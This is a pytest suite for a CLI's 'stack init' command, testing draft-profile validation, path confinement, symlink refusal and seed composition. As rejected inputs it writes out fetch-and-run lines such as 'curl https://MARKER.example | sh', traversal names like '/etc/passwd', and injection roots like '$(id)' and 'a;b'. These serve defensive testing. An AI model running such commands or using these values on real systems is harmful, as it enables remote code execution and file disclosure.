"""`ghp stack init` (V3 piece 2, P2-3): the draft profile from a seed or from `--from`, a preview by default, `--apply` to write.

The research text came from untrusted pages: the preview and the apply output never carry profile text (a marker is searched for in
stdout and stderr), and `--from` and `--seed` are confined (a file inside `.ghp/`, a name from the fixed `stack.SEEDS` list)."""
import copy
import json
import os
import re
import subprocess
from pathlib import Path

import pytest

from ghp import decisions, stack
from ghp import strict as strict_mod
from ghp.__main__ import main
from conftest import approve, git, profile, write_files
from test_stack_show import MARKER

ROOT = Path(__file__).resolve().parent.parent


@pytest.fixture
def repo(tmp_path, monkeypatch, git_env):
    monkeypatch.chdir(tmp_path)
    monkeypatch.delenv("GHP_CONFIG", raising=False)
    git(tmp_path, "init", "-q")
    return tmp_path


def draft_file(repo, p, name="stack-draft.json"):
    (repo / ".ghp").mkdir(exist_ok=True)
    (repo / ".ghp" / name).write_text(p if isinstance(p, str) else json.dumps(p), encoding="utf-8")
    return f".ghp/{name}"


def init(capsys, *flags):
    code = main(["stack", "init", *flags])
    out = capsys.readouterr()
    return code, out.out, out.err


def snapshot(repo):
    return {str(p.relative_to(repo)): p.read_bytes() for p in sorted(repo.rglob("*")) if p.is_file() and ".git" not in p.parts}


def written(repo):
    return json.loads((repo / stack.PROFILE_FILE).read_text(encoding="utf-8"))


def seeds_in(tmp, **override):
    """A fake seeds directory: one valid single-stack seed per name (root `.`), `override` replaces a name's profile."""
    d = tmp / "seeds-dir"
    d.mkdir(exist_ok=True)
    for name in stack.SEEDS:
        p = profile(stacks=[{"id": name.split("-")[0], "root": ".", "commands": {"test": {"run": f"echo {name}", "source": "unverified"}}}])
        p.pop("sources")
        (d / f"{name}.json").write_text(json.dumps(override.get(name, p)), encoding="utf-8")
    return d


# ---- the fixed tables ----
def test_seeds_and_seed_for_table():
    assert stack.SEEDS == ("python-pytest", "node-typescript", "salesforce")
    cases = [({"id": "python", "hints": {}}, "python-pytest"), ({"id": "python"}, "python-pytest"),
             ({"id": "typescript", "hints": {"package_manager": "npm"}}, "node-typescript"),
             ({"id": "node", "hints": {"package_manager": "npm"}}, "node-typescript"),
             ({"id": "node", "hints": {"package_manager": "pnpm"}}, None), ({"id": "node", "hints": {"package_manager": "yarn"}}, None),
             ({"id": "typescript", "hints": {"package_manager": "ambiguous"}}, None), ({"id": "node", "hints": {}}, None),
             ({"id": "salesforce", "hints": {"lwc_jest": True}}, "salesforce"),
             ({"id": "flutter", "hints": {}}, None), ({"id": "java", "hints": {"build_tool": "maven"}}, None),
             ({"id": "go"}, None), ({}, None)]
    for detected, seed in cases:
        assert stack.seed_for(detected) == seed, detected


def test_placeholder_or_real_seeds_ship_and_validate():
    for name in stack.SEEDS:
        raw = (Path(stack.SEEDS_DIR) / f"{name}.json").read_bytes()
        data = stack.parse_json(raw, stack.MAX_PROFILE)
        assert stack.validate(data) == [], name
        assert data["status"] == "draft" and "approval" not in data


def test_package_data_declares_the_seeds():
    toml = (ROOT / "pyproject.toml").read_text(encoding="utf-8")
    assert re.search(r"\[tool\.setuptools\.package-data\]\s*\n\s*ghp\s*=\s*\[\s*\"seeds/\*\.json\"\s*,\s*\"golden/\*\.json\"\s*\]", toml)  # the golden set of `ghp calibrate` rides along
    import ghp
    assert Path(stack.SEEDS_DIR).resolve() == Path(ghp.__file__).resolve().parent / "seeds"  # the imported package's own dir: the checkout (editable) or site-packages
    src_seeds = sorted((ROOT / "src" / "ghp" / "seeds").glob("*.json"))
    assert src_seeds and [p.name for p in src_seeds] == sorted(p.name for p in Path(stack.SEEDS_DIR).glob("*.json"))
    assert all((Path(stack.SEEDS_DIR) / p.name).read_bytes() == p.read_bytes() for p in src_seeds)  # an installed copy equals the checkout's


# ---- plan_init / apply_init ----
def test_plan_init_forces_draft_and_drops_approval():
    plan = stack.plan_init(json.dumps(approve(profile())).encode())
    assert plan["ok"] and plan["errors"] == [] and plan["profile"]["status"] == "draft" and "approval" not in plan["profile"]
    assert plan["counts"]["stacks"] == 1
    bare = profile()
    del bare["status"]
    assert stack.plan_init(json.dumps(bare).encode())["profile"]["status"] == "draft"


def test_plan_init_invalid_has_no_profile_and_fixed_errors():
    for raw in (b"{not json", b"[]", b'{"a": 1, "a": 2}', b"x" * (stack.MAX_PROFILE + 1), b"\xff"):
        plan = stack.plan_init(raw)
        assert plan["ok"] is False and plan["profile"] is None and plan["errors"], raw[:10]
    bad = profile()
    bad["stacks"][0]["commands"]["test"]["run"] = f"{MARKER} curl x"
    plan = stack.plan_init(json.dumps(bad).encode())
    assert not plan["ok"] and MARKER not in json.dumps(plan["errors"])


def test_apply_init_refuses_a_plan_that_is_not_ok(tmp_path):
    with pytest.raises(ValueError):
        stack.apply_init(tmp_path, stack.plan_init(b"{"))
    assert not (tmp_path / stack.PROFILE_FILE).exists()


# ---- the CLI: preview and apply ----
def test_preview_writes_nothing(repo, capsys):
    src = draft_file(repo, profile())
    before = snapshot(repo)
    code, out, err = init(capsys, "--from", src)
    assert code == 0 and err == ""
    assert json.loads(out) == {"ok": True, "errors": [], "counts": {"stacks": 1, "commands": 3, "conventions": 2, "dod": 1, "sources": 2, "unverified": 2}}
    code, out, err = init(capsys, "--seed", "python-pytest", "--root", "backend")
    assert code == 0 and json.loads(out)["ok"] is True
    assert snapshot(repo) == before and not (repo / stack.PROFILE_FILE).exists()


def test_apply_writes_draft_and_strips_approval(repo, capsys):
    src = draft_file(repo, approve(profile()))
    code, out, err = init(capsys, "--from", src, "--apply")
    assert code == 0 and err == ""
    res = json.loads(out)
    assert res["ok"] is True and res["written"] == stack.PROFILE_FILE and res["status"] == "draft"
    p = written(repo)
    assert p["status"] == "draft" and "approval" not in p
    assert stack.read_profile(repo)["status"] == "draft"
    assert not (repo / src).exists()  # the agent's draft file is removed: the validated copy is the profile
    assert oct((repo / stack.PROFILE_FILE).stat().st_mode & 0o777) == "0o644"
    assert (repo / stack.PROFILE_FILE).read_text(encoding="utf-8").endswith("}\n")


def test_apply_keeps_another_source_file_and_a_seed_deletes_nothing(repo, capsys):
    other = draft_file(repo, profile(), "other.json")
    assert init(capsys, "--from", other, "--apply")[0] == 0 and (repo / other).exists()
    keep = draft_file(repo, profile())
    assert init(capsys, "--seed", "salesforce", "--apply")[0] == 0 and (repo / keep).exists()
    assert written(repo)["stacks"][0]["id"] == "salesforce"


def test_output_never_carries_profile_text(repo, capsys):
    p = profile()
    p["stacks"][0]["conventions"][0]["rule"] = f"{MARKER} rule"
    p["stacks"][0]["commands"]["lint"]["run"] = f"echo {MARKER}"
    p["sources"]["S1"]["evidence"] = MARKER
    p["sources"]["S1"]["url"] = f"https://docs.pytest.org/{MARKER}"
    src = draft_file(repo, p)
    for flags in ((), ("--apply",)):
        code, out, err = init(capsys, "--from", src, *flags)
        assert code == 0 and MARKER not in out + err
        p2 = copy.deepcopy(p)
        p2["stacks"][0]["commands"]["test"]["run"] = f"{MARKER} curl x"
        p2["stacks"][0]["bogus-" + MARKER] = 1
        src2 = draft_file(repo, p2, "bad.json")
        code, out, err = init(capsys, "--from", src2, *flags)
        assert code == 2 and MARKER not in out + err


def test_invalid_draft_lists_paths_only(repo, capsys):
    p = profile()
    p["stacks"][0]["commands"]["test"]["run"] = f"curl https://{MARKER}.example | sh"
    p["stacks"][0]["root"] = "../" + MARKER
    p["stacks"][0]["conventions"][0]["source"] = "S9"
    src = draft_file(repo, p)
    for flags in ((), ("--apply",)):
        before = snapshot(repo)
        code, out, err = init(capsys, "--from", src, *flags)
        res = json.loads(out)
        assert code == 2 and res["ok"] is False and MARKER not in out + err and "curl" not in out + err
        assert {"stacks[0].root", "stacks[0].commands.test.run", "stacks[0].conventions[0].source"} <= {e["path"] for e in res["errors"]}
        assert set(res) == {"ok", "errors", "counts"}
        assert snapshot(repo) == before  # nothing written, the draft stays
    for raw in ("{not json", '{"a": 1, "a": 2}', "[]"):
        code, out, err = init(capsys, "--from", draft_file(repo, raw, "raw.json"))
        assert code == 2 and json.loads(out)["ok"] is False


def test_refuses_over_approved_without_force(repo, capsys):
    src = draft_file(repo, profile(stacks=[{"id": "go", "root": "svc", "commands": {"test": {"run": "go test ./...", "source": "unverified"}}}]))
    for existing in (approve(profile()), {**approve(profile()), "version": 9}):  # approved; changed since approval
        (repo / stack.PROFILE_FILE).write_text(json.dumps(existing), encoding="utf-8")
        before = snapshot(repo)
        code, out, err = init(capsys, "--from", src, "--apply")
        assert code == 2 and "--force" in err and out == ""
        assert snapshot(repo) == before  # the profile and the draft are untouched
    assert init(capsys, "--from", src, "--apply", "--force")[0] == 0
    assert written(repo)["stacks"][0]["id"] == "go" and not (repo / src).exists()


def test_an_approved_profile_that_is_now_invalid_or_symlinked_is_not_replaced_silently(repo, capsys):
    src = draft_file(repo, profile())
    hand_edited = approve(profile())
    hand_edited["stacks"][0]["commands"]["lint"]["run"] = "curl https://x.example | sh"  # a tripwire token added by hand: now invalid
    with_approval_only = {**profile(), "approval": {"by": "tech lead"}}
    for existing in (hand_edited, with_approval_only, {**approve(profile()), "unknown-key": 1}):
        (repo / stack.PROFILE_FILE).write_text(json.dumps(existing), encoding="utf-8")
        assert stack.read_profile(repo)["status"] == "invalid"
        before = snapshot(repo)
        code, out, err = init(capsys, "--from", src, "--apply")
        assert code == 2 and "--force" in err and out == "" and snapshot(repo) == before
        assert init(capsys, "--from", src, "--apply", "--force")[0] == 0
        draft_file(repo, profile())
    # a symlinked destination is refused entirely, with or without --force, and the target is untouched
    target = repo / "elsewhere.json"
    target.write_text(json.dumps(approve(profile())), encoding="utf-8")
    (repo / stack.PROFILE_FILE).unlink()
    os.symlink(target, repo / stack.PROFILE_FILE)
    before = target.read_bytes()
    for flags in ((), ("--force",)):
        code, out, err = init(capsys, "--from", src, "--apply", *flags)
        assert code == 2 and "symlink" in err and out == "" and target.read_bytes() == before and (repo / stack.PROFILE_FILE).is_symlink()
        assert (repo / src).exists()


def test_an_existing_draft_or_invalid_file_is_replaced_without_force(repo, capsys):
    src = draft_file(repo, profile())
    for old in (json.dumps(profile(version=7)), "{broken"):
        (repo / stack.PROFILE_FILE).write_text(old, encoding="utf-8")
        draft_file(repo, profile())
        assert init(capsys, "--from", src, "--apply")[0] == 0 and written(repo)["version"] == 2


def test_a_failed_write_keeps_the_existing_file_and_leaves_no_temp_file(repo, capsys, monkeypatch):
    old = json.dumps(profile(version=7))
    (repo / stack.PROFILE_FILE).write_text(old, encoding="utf-8")
    src = draft_file(repo, profile())

    def boom(path, text):
        raise OSError("disk full")
    monkeypatch.setattr(decisions, "_atomic_write", boom)
    code, out, err = init(capsys, "--from", src, "--apply")
    assert code == 2 and "disk full" not in err
    assert (repo / stack.PROFILE_FILE).read_text(encoding="utf-8") == old and (repo / src).exists()


def test_apply_goes_through_the_atomic_write_and_reads_back(repo, capsys, monkeypatch):
    calls = []
    real = decisions._atomic_write
    monkeypatch.setattr(decisions, "_atomic_write", lambda path, text: (calls.append(Path(path).name), real(path, text)))
    assert init(capsys, "--from", draft_file(repo, profile()), "--apply")[0] == 0
    assert calls == [stack.PROFILE_FILE] and [p.name for p in repo.iterdir() if p.name.endswith(".tmp")] == []
    monkeypatch.setattr(decisions, "_atomic_write", lambda path, text: real(path, text[:-3]))  # a write that does not read back
    code, out, err = init(capsys, "--from", draft_file(repo, profile(), "again.json"), "--apply", "--force")
    assert code == 2 and "read back" in err


# ---- --from is confined ----
def test_from_outside_ghp_dir_refused(repo, capsys):
    write_files(repo, {"x.json": json.dumps(profile()), "sub/y.json": json.dumps(profile()), ".ghp/keep": ""})
    outside = repo.parent / f"{repo.name}-outside.json"
    outside.write_text(json.dumps(profile()), encoding="utf-8")
    for path in ("x.json", "sub/y.json", "./x.json", ".ghp/../x.json", ".ghpp/x.json", str(outside), str(repo / "x.json"), "ghp.config.json", ".ghp", ".ghp/", "",
                 ".ghp/missing.json", str(repo / ".ghp")):
        code, out, err = init(capsys, "--from", path)
        assert code == 2 and out == "" and err.startswith("error: ") and "x.json" not in err and "outside" not in err.replace("inside", ""), path
        assert "ZZ" not in err
    assert not (repo / stack.PROFILE_FILE).exists()


def test_from_inside_ghp_dir_absolute_or_dotted_is_accepted(repo, capsys):
    draft_file(repo, profile())
    for path in (str(repo / ".ghp" / "stack-draft.json"), "./.ghp/stack-draft.json", ".ghp/../.ghp/stack-draft.json"):
        assert init(capsys, "--from", path)[0] == 0, path


def test_from_symlink_refused(repo, capsys):
    real = draft_file(repo, profile(), "real.json")
    os.symlink("real.json", repo / ".ghp" / "link.json")  # a symlink inside .ghp to a file inside .ghp
    outside = repo / "outside.json"
    outside.write_text(json.dumps(profile()), encoding="utf-8")
    os.symlink(outside, repo / ".ghp" / "out.json")
    for path in (".ghp/link.json", ".ghp/out.json"):
        code, out, err = init(capsys, "--from", path, "--apply")
        assert code == 2 and out == "", path
    assert init(capsys, "--from", real)[0] == 0
    assert not (repo / stack.PROFILE_FILE).exists()


def test_from_a_hard_link_refused_and_the_text_names_the_caps(repo, capsys):
    real = draft_file(repo, profile(), "real.json")
    os.link(repo / real, repo / ".ghp" / "hard.json")
    code, out, err = init(capsys, "--from", ".ghp/hard.json", "--apply")
    assert code == 2 and out == "" and "256 KiB" in err and "single-link" in err and not (repo / stack.PROFILE_FILE).exists()
    os.unlink(repo / ".ghp" / "hard.json")
    assert init(capsys, "--from", real)[0] == 0


def test_from_when_ghp_dir_is_a_symlink_refused(repo, capsys):
    elsewhere = repo / "elsewhere"
    elsewhere.mkdir()
    (elsewhere / "d.json").write_text(json.dumps(profile()), encoding="utf-8")
    os.symlink(elsewhere, repo / ".ghp")
    code, out, err = init(capsys, "--from", ".ghp/d.json", "--apply")
    assert code == 2 and not (repo / stack.PROFILE_FILE).exists()


def test_from_not_a_regular_file_or_too_big_refused(repo, capsys):
    (repo / ".ghp").mkdir()
    os.mkfifo(repo / ".ghp" / "fifo.json")
    (repo / ".ghp" / "adir.json").mkdir()
    (repo / ".ghp" / "big.json").write_text(" " * (stack.MAX_PROFILE + 1) + json.dumps(profile()), encoding="utf-8")
    (repo / ".ghp" / "bin.json").write_bytes(b"\xff\xfe{}")
    for path in (".ghp/fifo.json", ".ghp/adir.json", ".ghp/big.json", ".ghp/bin.json"):
        code, out, err = init(capsys, "--from", path)
        assert code == 2, path
    assert not (repo / stack.PROFILE_FILE).exists()


# ---- --seed is looked up only among stack.SEEDS ----
def test_seed_name_not_in_list_exit_2(repo, capsys, monkeypatch, tmp_path):
    monkeypatch.setattr(stack, "SEEDS_DIR", seeds_in(tmp_path))
    (tmp_path / "x.json").write_text(json.dumps(profile()), encoding="utf-8")
    (tmp_path / "y.json").write_text(json.dumps(profile()), encoding="utf-8")
    texts = set()
    for name in ("../x", "python-pytest/../y", "../seeds-dir/python-pytest", "python-pytest/", "python-pytest\n", " python-pytest", "Python-Pytest", "python", "", "/etc/passwd",
                 "python-pytest.json", "python-pytest\x00"):
        code, out, err = init(capsys, "--seed", name, "--root", "backend", "--apply")
        assert code == 2 and out == "" and err.startswith("error: "), name
        texts.add(err)
        assert "unknown seed" in err, name
        assert not (repo / stack.PROFILE_FILE).exists(), name
    assert len(texts) == 1  # one fixed text: the input is never echoed


def test_seed_lookup_never_builds_a_path_from_the_input(monkeypatch, tmp_path):
    monkeypatch.setattr(stack, "SEEDS_DIR", seeds_in(tmp_path))
    for bad in ("../x", "python-pytest/../python-pytest"):
        with pytest.raises(ValueError):
            stack.plan_init(bad, root=str(tmp_path), seed_root=".")
    assert stack.plan_init("python-pytest", root=str(tmp_path), seed_root=".")["ok"]


def test_a_missing_or_broken_seed_file_is_exit_2(repo, capsys, monkeypatch, tmp_path):
    d = seeds_in(tmp_path)
    (d / "salesforce.json").unlink()
    (d / "node-typescript.json").write_text("{broken", encoding="utf-8")
    monkeypatch.setattr(stack, "SEEDS_DIR", d)
    for name in ("salesforce", "node-typescript"):
        code, out, err = init(capsys, "--seed", name, "--root", ".")
        assert code == 2 and not (repo / stack.PROFILE_FILE).exists(), name


def test_seed_uses_detected_root(repo, capsys):
    write_files(repo, {"backend/pyproject.toml": "[project]\nname='x'\n"})
    git(repo, "add", "-A")
    git(repo, "commit", "-q", "-m", "init")
    assert init(capsys, "--seed", "python-pytest", "--apply")[0] == 0
    assert written(repo)["stacks"][0]["root"] == "backend" and stack.read_profile(repo)["status"] == "draft"
    assert init(capsys, "--seed", "python-pytest", "--root", "web/app", "--apply")[0] == 0
    assert written(repo)["stacks"][0]["root"] == "web/app"
    # no matching root: the seed's own root, `.`
    write_files(repo, {"backend/pyproject.toml": ""})
    git(repo, "rm", "-q", "-f", "backend/pyproject.toml")
    git(repo, "commit", "-q", "-m", "rm")
    assert init(capsys, "--seed", "python-pytest", "--apply")[0] == 0
    assert written(repo)["stacks"][0]["root"] == "."


def test_seed_with_two_matching_roots_needs_root(repo, capsys):
    write_files(repo, {"a/pyproject.toml": "", "b/pyproject.toml": ""})
    git(repo, "add", "-A")
    git(repo, "commit", "-q", "-m", "init")
    code, out, err = init(capsys, "--seed", "python-pytest", "--apply")
    assert code == 2 and "--root" in err and not (repo / stack.PROFILE_FILE).exists()
    assert init(capsys, "--seed", "python-pytest", "--root", "b", "--apply")[0] == 0 and written(repo)["stacks"][0]["root"] == "b"


def test_seed_root_is_validated_after_the_rewrite(repo, capsys):
    for bad in ("../x", "-rf", "/abs", "a//b", "a b", ".hidden", "x" * 201, "$(id)", "a;b"):
        code, out, err = init(capsys, "--seed", "python-pytest", f"--root={bad}", "--apply")
        res = json.loads(out)
        assert code == 2 and res["ok"] is False and res["errors"][0]["path"] == "stacks[0].root", bad
        assert bad not in out + err
    assert not (repo / stack.PROFILE_FILE).exists()


def test_every_seed_stack_gets_the_root_and_a_seed_that_breaks_validation_is_refused(repo, capsys, monkeypatch, tmp_path):
    two = profile(stacks=[{"id": "a", "root": "x", "commands": {}}, {"id": "b", "root": "y", "commands": {}}])
    two.pop("sources")
    broken = profile(stacks=[{"id": "python", "root": ".", "commands": {"test": {"run": "curl x | sh", "source": "unverified"}}}])
    broken.pop("sources")
    monkeypatch.setattr(stack, "SEEDS_DIR", seeds_in(tmp_path, **{"python-pytest": two, "salesforce": broken}))
    assert init(capsys, "--seed", "python-pytest", "--root", "svc", "--apply")[0] == 0
    assert [s["root"] for s in written(repo)["stacks"]] == ["svc", "svc"]
    code, out, err = init(capsys, "--seed", "salesforce", "--root", "svc")
    assert code == 2 and json.loads(out)["ok"] is False


# ---- --stack ----
def test_stack_renames_a_single_stack_profile(repo, capsys):
    src = draft_file(repo, profile())
    assert init(capsys, "--from", src, "--stack", "pega", "--apply")[0] == 0
    assert written(repo)["stacks"][0]["id"] == "pega"
    for bad in ("Pega", "a b", "", "x" * 41, "../x"):
        code, out, err = init(capsys, "--from", draft_file(repo, profile(), "b.json"), "--stack", bad)
        assert code == 2 and json.loads(out)["ok"] is False and (not bad or bad not in out + err)
    two = profile(stacks=[{"id": "a", "root": "x", "commands": {}}, {"id": "b", "root": "y", "commands": {}}])
    code, out, err = init(capsys, "--from", draft_file(repo, two, "two.json"), "--stack", "c")
    assert code == 2 and json.loads(out)["ok"] is False
    for odd in ('{"schema": 1, "version": 1}', '{"stacks": "x"}', '{"stacks": [1]}', '{"stacks": []}'):
        code, out, err = init(capsys, "--from", draft_file(repo, odd, "odd.json"), "--stack", "c")
        assert code == 2 and json.loads(out)["ok"] is False, odd


# ---- usage ----
def test_flag_combinations(repo, capsys):
    src = draft_file(repo, profile())
    for argv in (["stack", "init"], ["stack", "init", "--from", src, "--seed", "salesforce"], ["stack", "init", "--from", src, "--root", "x"],
                 ["stack", "init", "--from", src, "--force"], ["stack", "init", "--seed", "salesforce", "--force"]):
        with pytest.raises(SystemExit) as e:
            main(argv)
        assert e.value.code == 2, argv
        capsys.readouterr()
    assert not (repo / stack.PROFILE_FILE).exists()


def test_init_needs_no_config_token_or_git_for_from(tmp_path, monkeypatch, capsys):
    monkeypatch.chdir(tmp_path)
    monkeypatch.delenv("GHP_CONFIG", raising=False)
    (tmp_path / ".ghp").mkdir()
    (tmp_path / ".ghp" / "d.json").write_text(json.dumps(profile()), encoding="utf-8")
    assert init(capsys, "--from", ".ghp/d.json", "--apply")[0] == 0


# ---- P2-16c: several --seed flags build ONE draft (a polyglot repo); a single --seed is byte-for-byte what it always was ----
POLY = {"pyproject.toml": "[project]\nname='x'\n", "package.json": "{}\n", "package-lock.json": "{}\n"}
SPLIT = {"backend/pyproject.toml": "[project]\nname='x'\n", "web/package.json": "{}\n", "web/package-lock.json": "{}\n"}


def commit_all(repo, files):
    write_files(repo, files)
    git(repo, "add", "-A")
    git(repo, "commit", "-q", "-m", "init")


def seed_data(name):
    return json.loads((Path(stack.SEEDS_DIR) / f"{name}.json").read_text(encoding="utf-8"))


def source_refs(node):
    """Every `source` value under `node`, in document order."""
    if isinstance(node, dict):
        return [v for k, x in node.items() for v in ([x] if k == "source" else source_refs(x))]
    return [v for x in node for v in source_refs(x)] if isinstance(node, list) else []


def test_two_seeds_one_draft(repo, capsys):
    commit_all(repo, SPLIT)  # different roots, taken from detect
    code, out, err = init(capsys, "--seed", "python-pytest", "--seed", "node-typescript")
    assert code == 0 and err == "" and not (repo / stack.PROFILE_FILE).exists()  # a preview writes nothing
    assert json.loads(out)["counts"] == {"stacks": 2, "commands": 7, "conventions": 17, "dod": 9, "sources": 22, "unverified": 0}
    assert init(capsys, "--seed", "python-pytest", "--seed", "node-typescript", "--apply")[0] == 0
    p = written(repo)
    assert [(s["id"], s["root"]) for s in p["stacks"]] == [("python", "backend"), ("typescript", "web")]
    assert p["status"] == "draft" and "approval" not in p and stack.validate(p) == [] and stack.read_profile(repo)["status"] == "draft"
    assert init(capsys, "--seed", "node-typescript", "--seed", "python-pytest", "--apply", "--force")[0] == 0  # the order is the order of the flags
    assert [(s["id"], s["root"]) for s in written(repo)["stacks"]] == [("typescript", "web"), ("python", "backend")]
    # both at `.` (the fastapi full-stack shape): allowed, the ids differ
    git(repo, "rm", "-q", "-r", "-f", "backend", "web")
    commit_all(repo, POLY)
    assert init(capsys, "--seed", "python-pytest", "--seed", "node-typescript", "--apply", "--force")[0] == 0
    p = written(repo)
    assert [(s["id"], s["root"]) for s in p["stacks"]] == [("python", "."), ("typescript", ".")] and stack.validate(p) == []
    assert stack.uncovered(p, stack.detect(".")) == []  # the draft covers every detected root


def test_source_ids_renumbered_and_valid(repo, capsys):
    py, ts, sf = (seed_data(n) for n in ("python-pytest", "node-typescript", "salesforce"))
    assert init(capsys, "--seed", "python-pytest", "--seed", "node-typescript", "--seed", "salesforce", "--apply")[0] == 0
    p = written(repo)
    assert stack.validate(p) == [] and list(p["sources"]) == [f"S{n}" for n in range(1, len(py["sources"]) + len(ts["sources"]) + len(sf["sources"]) + 1)]
    off = {0: 0, 1: len(py["sources"]), 2: len(py["sources"]) + len(ts["sources"])}
    for i, seed in enumerate((py, ts, sf)):
        new = {f"S{n}": f"S{n + off[i]}" for n in range(1, len(seed["sources"]) + 1)}
        refs = source_refs(seed["stacks"])
        assert source_refs(p["stacks"][i]) == [new.get(r, r) for r in refs] and refs  # every reference moved with its source
        for old, now in new.items():
            assert p["sources"][now] == seed["sources"][old]
        # the free text that cites a source ("S3: ...") moved with it
        why = json.dumps(seed["stacks"][0]["commands"]["test"]["why"])
        assert json.dumps(p["stacks"][i]["commands"]["test"]["why"]) == re.sub(r"\bS(\d+)\b", lambda m: new.get(m.group(0), m.group(0)), why)
    assert any(r != o for r, o in zip(source_refs(p["stacks"][1]), source_refs(ts["stacks"])))  # the second seed really moved


def test_every_seed_mention_of_a_source_in_a_why_is_defined():
    for name in stack.SEEDS:  # the renumbering rewrites S<n> in a why: each one must be a source of that seed
        seed = seed_data(name)
        text = json.dumps(seed["stacks"])
        assert not set(re.findall(r"\bS\d+\b", text)) - set(seed["sources"]), name


def test_duplicate_stack_id_refused(repo, capsys):
    commit_all(repo, SPLIT)
    texts = set()
    for argv in (["--seed", "python-pytest", "--seed", "python-pytest"], ["--seed", "node-typescript", "--seed", "salesforce", "--seed", "node-typescript"]):
        code, out, err = init(capsys, *argv, "--apply")
        assert code == 2 and out == "" and err.startswith("error: ") and "same stack id" in err and not (repo / stack.PROFILE_FILE).exists()
        texts.add(err)
    assert len(texts) == 1  # one fixed text
    # two roots for one of the seeds: refused with a fixed text (--root is for a single seed)
    commit_all(repo, {"other/pyproject.toml": ""})
    code, out, err = init(capsys, "--seed", "python-pytest", "--seed", "node-typescript", "--apply")
    assert code == 2 and "more than one detected root" in err and "backend" not in err and not (repo / stack.PROFILE_FILE).exists()


def test_root_and_stack_need_exactly_one_seed(repo, capsys):
    commit_all(repo, POLY)
    with pytest.raises(SystemExit) as e:
        main(["stack", "init", "--seed", "python-pytest", "--seed", "node-typescript", "--root", "x"])
    assert e.value.code == 2
    capsys.readouterr()
    code, out, err = init(capsys, "--seed", "python-pytest", "--seed", "node-typescript", "--stack", "x")
    assert code == 2 and json.loads(out)["ok"] is False and not (repo / stack.PROFILE_FILE).exists()
    with pytest.raises(SystemExit) as e:
        main(["stack", "init", "--from", "x", "--seed", "python-pytest", "--seed", "node-typescript"])
    assert e.value.code == 2


def test_single_seed_output_unchanged(repo, capsys):
    """The pre-change behaviour, restated independently: the seed file with `status` draft, no `approval`, every stack's root rewritten,
    `json.dumps(indent=2, ensure_ascii=False)` and a newline. Recorded sha256 of the files and output of the pre-change code are in the report."""
    for name in stack.SEEDS:
        for root_flags, root in (((), "."), (("--root", "svc"), "svc")):
            seed = seed_data(name)
            seed.pop("approval", None)
            seed["status"] = "draft"
            for st in seed["stacks"]:
                st["root"] = root
            expect = json.dumps(seed, indent=2, ensure_ascii=False) + "\n"
            code, out, err = init(capsys, "--seed", name, *root_flags, "--apply")
            assert code == 0 and err == "" and (repo / stack.PROFILE_FILE).read_bytes() == expect.encode("utf-8"), (name, root)
            assert json.loads(out) == {"ok": True, "errors": [], "counts": stack._counts(seed), "written": stack.PROFILE_FILE, "status": "draft"}
    plan = stack.plan_init(["python-pytest"], str(repo), seed_root="x")  # a list of one seed is the single-seed path
    assert plan == stack.plan_init("python-pytest", str(repo), seed_root="x")


def test_composed_command_runs_each_stack(repo, capsys, monkeypatch, tmp_path):
    def seed(sid, marker):
        p = profile(stacks=[{"id": sid, "root": ".", "commands": {"test": {"run": f"echo {sid} > {marker}", "source": "unverified"}}}])
        p.pop("sources")
        return p
    monkeypatch.setattr(stack, "SEEDS_DIR", seeds_in(tmp_path, **{"python-pytest": seed("python", "ran-python"), "node-typescript": seed("typescript", "ran-node")}))
    commit_all(repo, SPLIT)
    assert init(capsys, "--seed", "python-pytest", "--seed", "node-typescript", "--apply")[0] == 0
    cmd = stack.compose_test_command(written(repo))
    assert cmd is not None and cmd.count("&&") >= 3
    r = subprocess.run(["sh", "-c", cmd], cwd=repo, capture_output=True, text=True)
    assert r.returncode == 0, r.stderr
    assert (repo / "backend" / "ran-python").read_text() == "python\n" and (repo / "web" / "ran-node").read_text() == "typescript\n"


# T23 lifted the skip (strict has `_DRAFT_IT`). The docs, commands and rules files do not exist yet (T32, T38): the scan covers the ones that do, the source files always.
def test_fix_texts_do_not_suggest_dropping_a_stack():
    old = re.compile(r"init\s+--seed\s+<name>")
    files = [*(ROOT / "src" / "ghp").glob("*.py"), *(ROOT / "commands").glob("*.md"), *(ROOT / "docs").glob("*.md"), *(ROOT / "rules").glob("*.md"),
             *(f for f in (ROOT / "README.md", ROOT / "AGENTS.md", ROOT / "CHANGELOG.md") if f.exists())]
    assert len(files) > 20
    for f in files:
        assert not old.search(re.sub(r"\s+", " ", f.read_text(encoding="utf-8"))), f.name
    from ghp import strict
    assert "--seed <a> --seed <b>" in strict._DRAFT_IT and "--from" in strict._DRAFT_IT and "every detected stack" in strict._DRAFT_IT


# ---- P2-16d: unknown seed text, exit codes of the composed command, init warnings ----
def test_unknown_seed_among_others_keeps_its_own_text(repo, capsys):
    commit_all(repo, SPLIT)
    texts = set()
    for argv in (["--seed", "python-pytest", "--seed", "nope"], ["--seed", "nope", "--seed", "python-pytest"], ["--seed", "nope"]):
        code, out, err = init(capsys, *argv, "--apply")
        assert code == 2 and err.startswith("error: unknown seed; it must be one of: ") and "nope" not in err, argv  # the argument is never echoed
        assert "not installed or cannot be read" not in err and not (repo / stack.PROFILE_FILE).exists()
        texts.add(err)
    assert len(texts) == 1


@pytest.mark.parametrize("failing", ["first", "second"])
def test_composed_command_propagates_failure(repo, capsys, monkeypatch, tmp_path, failing):
    def seed(sid, code):
        p = profile(stacks=[{"id": sid, "root": ".", "commands": {"test": {"run": f"exit {code}", "source": "unverified"}}}])
        p.pop("sources")
        return p
    codes = {"first": (3, 0), "second": (0, 5)}[failing]
    monkeypatch.setattr(stack, "SEEDS_DIR", seeds_in(tmp_path, **{"python-pytest": seed("python", codes[0]), "node-typescript": seed("typescript", codes[1])}))
    commit_all(repo, SPLIT)
    assert init(capsys, "--seed", "python-pytest", "--seed", "node-typescript", "--apply")[0] == 0
    cmd = stack.compose_test_command(written(repo))
    r = subprocess.run(["sh", "-c", cmd], cwd=repo, capture_output=True, text=True)
    assert r.returncode == max(codes), (r.returncode, r.stderr)  # that stack's own exit code, not 0
    ok = subprocess.run(["sh", "-c", stack.compose_test_command(profile(stacks=[
        {"id": "a", "root": "backend", "commands": {"test": {"run": "exit 0", "source": "unverified"}}},
        {"id": "b", "root": "web", "commands": {"test": {"run": "exit 0", "source": "unverified"}}}]))], cwd=repo, capture_output=True, text=True)
    assert ok.returncode == 0  # control: both pass


def long_draft(root_len):
    """Two stacks whose roots are `root_len` characters of one segment each: the composed command grows with them."""
    return profile(sources={}, stacks=[{"id": sid, "root": ch * root_len, "commands": {"test": {"run": "echo " + "x" * 90, "source": "unverified"}}}
                                       for sid, ch in (("a", "r"), ("b", "s"))])


